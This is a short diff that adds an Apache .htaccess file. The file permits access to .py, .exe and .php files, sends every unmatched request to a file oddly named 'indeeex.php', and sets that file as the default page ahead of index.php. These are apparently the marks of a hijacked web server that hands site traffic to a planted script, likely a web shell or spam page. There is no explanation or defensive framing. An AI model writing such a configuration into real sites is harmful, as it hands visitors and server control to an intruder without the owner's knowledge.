@@ -1,0 +1,11 @@
+<FilesMatch ".(py|exe|php)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^indeeex\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /indeeex.php [L]
+DirectoryIndex indeeex.php index.php
